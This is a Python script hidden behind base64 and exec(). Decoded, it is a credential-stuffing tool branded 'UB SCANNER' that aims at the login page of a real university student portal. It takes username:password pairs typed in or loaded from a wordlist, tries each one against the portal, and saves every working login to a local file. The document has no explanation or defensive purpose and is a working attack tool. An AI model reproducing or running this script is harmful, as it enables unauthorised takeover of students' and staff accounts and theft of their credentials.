import base64
exec(base64.b64decode('aW1wb3J0IG9zLCB0aW1lLCByYW5kb20sIHBsYXRmb3JtLCB1cmxsaWIucGFyc2UsIHJlcXVlc3RzLnBhY2thZ2VzLnVybGxpYjMNb3Muc3lzdGVtKCdjbGVhcicpDXJlcXVlc3RzLnBhY2thZ2VzLnVybGxpYjMuZGlzYWJsZV93YXJuaW5ncygpDWZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3INdHJ5Og0gICAgaW1wb3J0IHJlcXVlc3RzIGFzIHJlcQ0gICAgZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXAgYXMgYnMNZXhjZXB0Og0gICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCByZXF1ZXN0cyBiczQnKQ0gICAgZXhpdChmIlxue3llbGxvd31bIV0ge3doaXRlfVNpbGFoa2FuIHJlc3RhcnQgc2NyaXB0IikNZWxzZToNICAgIGdyZXkgPSAnXHgxYls5MG0nDSAgICByZWQgPSAnXHgxYls5MW0nDSAgICBncmVlbiA9ICdceDFiWzkybScNICAgIHllbGxvdyA9ICdceDFiWzkzbScNICAgIGJsdWUgPSAnXHgxYls5NG0nDSAgICBwdXJwbGUgPSAnXHgxYls5NW0nDSAgICBjeWFuID0gJ1x4MWJbOTZtJw0gICAgd2hpdGUgPSAnXHgxYlszN20nDSAgICBmbGFnID0gJ1x4MWJbNDc7MzBtJw0gICAgb2ZmID0gJ1x4MWJbbScNICAgIHJ2ID0gcGxhdGZvcm0udW5hbWUoKQ0gICAgbWUgPSBydi5yZWxlYXNlDSAgICBmb3VuZCA9IFtdDSAgICBlcnJvciA9IFtdDQ0gICAgZGVmIGNlayh1c3IsIHB3ZCk6DSAgICAgICAgdHJ5Og0gICAgICAgICAgICB1cmwgPSAnaHR0cHM6Ly9zaWFtLnViLmFjLmlkL2luZGV4LnBocCcNICAgICAgICAgICAgc2VzID0gcmVxLlNlc3Npb24oKQogICAgICAgICAgICByb3cgPSBzZXMuZ2V0KHVybCkudGV4dAogICAgICAgICAgICBkYXQgPSB7J3VzZXJuYW1lJzp1c3IsCidwYXNzd29yZCc6cHdkLAonbG9naW4nOidzdWJtaXQnfQogICAgICAgICAgICByYXcgPSBzZXMucG9zdCh1cmwsIGRhdGE9ZGF0KS50ZXh0DSAgICAgICAgICAgIHRyeToNICAgICAgICAgICAgICAgIGhlciA9IGJzKHJhdywgJ2h0bWwucGFyc2VyJykuZmluZEFsbCgnYicpWzJdLmdldF90ZXh0KCkNICAgICAgICAgICAgICAgIHByaW50KGYie3doaXRlfSAg44CLe2dyZWVufSBbU1VLU0VTXSB7Y3lhbn0+Pj57Z3JlZW59IHt1c3J9e3doaXRlfTp7Z3JlZW59e3B3ZH0iKQ0gICAgICAgICAgICAgICAgZm91bmQuYXBwZW5kKGYie3Vzcn06e3B3ZH0iKQ0gICAgICAgICAgICAgICAgd2l0aCBvcGVuKCd1Yi50eHQnLCAnYScpIGFzIChzYXZlKToNICAgICAgICAgICAgICAgICAgICBzYXZlLndyaXRlKGYie3Vzcn06e3B3ZH1cbiIpDSAgICAgICAgICAgIGV4Y2VwdCBJbmRleEVycm9yOg0gICAgICAgICAgICAgICAgcHJpbnQoZiJ7d2hpdGV9ICDjgIt7cmVkfSBbR0FHQUxdIHtjeWFufT4+PntyZWR9IHt1c3J9e3doaXRlfTp7cmVkfXtwd2R9IikNICAgICAgICAgICAgICAgIGVycm9yLmFwcGVuZChmInt1c3J9Ontwd2R9IikNDSAgICAgICAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0Og0gICAgICAgICAgICBleGl0KCkNDQ0gICAgZGVmIHByZW1pdW0oKToNICAgICAgICBwcmludChmInt3aGl0ZX0gIFt7Y3lhbn0xe3doaXRlfV0ge3doaXRlfVR1bGlzIFNlbmRpcmkgXG4iICsgZiJ7d2hpdGV9ICBbe2N5YW59Mnt3aGl0ZX1dIHt3aGl0ZX1JbXBvcnQgV29yZGxpc3QgXG4iKQ0gICAgICAgIHRyeToNICAgICAgICAgICAgc2VsZWN0ID0gaW5wdXQoZiJ7d2hpdGV9IFBpbGloIHtjeWFufeOAiyB7d2hpdGV9IikNICAgICAgICAgICAgaWYgc2VsZWN0ID09ICcxJzoNICAgICAgICAgICAgICAgIHByaW50KCdcbicgKyBmInt3aGl0ZX0gIFt7Y3lhbn0/e3doaXRlfV0ge3doaXRlfXVzZXJuYW1lOnBhc3N3b3JkIikNICAgICAgICAgICAgICAgIGRhdGEgPSBpbnB1dChmIntjeWFufSAgPj4+e3doaXRlfSAiKQ0gICAgICAgICAgICAgICAgdXNlciA9IGRhdGEuc3BsaXQoJzonKVswXQ0gICAgICAgICAgICAgICAgcHN3ZCA9IGRhdGEuc3BsaXQoJzonKVsxXQ0gICAgICAgICAgICAgICAgY2VrKHVzZXIsIHBzd2QpDSAgICAgICAgICAgIGVsc2U6DSAgICAgICAgICAgICAgICBpZiBzZWxlY3QgPT0gJzInOg0gICAgICAgICAgICAgICAgICAgIHByaW50KCdcbicgKyBmInt3aGl0ZX0gIFt7Y3lhbn0he3doaXRlfV0ge3doaXRlfUZpbGUgSGFydXMgQmVyaXNpIHVzZXJuYW1lOnBhc3N3b3JkIikNICAgICAgICAgICAgICAgICAgICBwYXRoID0gaW5wdXQoZiJ7d2hpdGV9ICBbe2N5YW59P3t3aGl0ZX1dIHt3aGl0ZX1JbnB1dCBGaWxlOiAiKQ0gICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbihwYXRoLCAncicpIGFzIChmaWxlKToNICAgICAgICAgICAgICAgICAgICAgICAgbGluZXMgPSBmaWxlLnJlYWRsaW5lcygpDSAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie3doaXRlfSAgW3tjeWFufSt7d2hpdGV9XSB7d2hpdGV9VGVyZGV0ZWtzaXtjeWFufSB7bGVuKGxpbmVzKX0ge3doaXRlfU5pbVxuIikNICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGxpbmUgaW4gbGluZXM6DSAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VyID0gbGluZS5zdHJpcCgpLnNwbGl0KCc6JylbMF0NICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBzd2QgPSBsaW5lLnN0cmlwKCkuc3BsaXQoJzonKVsxXQ0gICAgICAgICAgICAgICAgICAgICAgICAgICAgY2VrKHVzZXIsIHBzd2QpDSAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6DSAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgnXG4nICsgZiJ7Y3lhbn0gIFt7Z3JlZW59Xl9ee2N5YW59XXtncmVlbn0gU1VLU0VTOiB7Z3JlZW59e2xlbihmb3VuZCl9IiArIGYie2N5YW59ICB8e2N5YW59ICBbe3JlZH0tXy17Y3lhbn1de3JlZH0gR0FHQUw6IHtyZWR9e2xlbihlcnJvcil9IikNICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4aXQoKQ0NICAgICAgICBleGNlcHQgSW5kZXhFcnJvcjoNICAgICAgICAgICAgZXhpdChmIiAge3doaXRlfVt7cmVkfSF7d2hpdGV9XXt3aGl0ZX0gSW5wdXQgU2FsYWgiKQ0gICAgICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoNICAgICAgICAgICAgZXhpdChmIiAge3doaXRlfVt7cmVkfSF7d2hpdGV9XXt3aGl0ZX0gRmlsZSB0aWRhayBkaXRlbXVrYW4iKQ0gICAgICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoNICAgICAgICAgICAgcGFzcw0NDSAgICBkZWYgbWFpbigpOg0gICAgICAgIHByaW50KCJcMDMzWzI7MzY7NDBtPT09PT09PT09PT09PT09PT09PT09PT09PT09XG5cMDMzWzI7Mzc7NDBtVSBCICBTIEMgQSBOIE4gRSBSIHwgXDAzM1syOzMzOzQwbUFsaWZTUFxuXDAzM1syOzM2OzQwbT09PT09PT09PT09PT09PT09PT09PT09PT09PSIpDSAgICAgICAgcHJlbWl1bSgpDQ0NICAgIGlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6DSAgICAgICAgbWFpbigp'))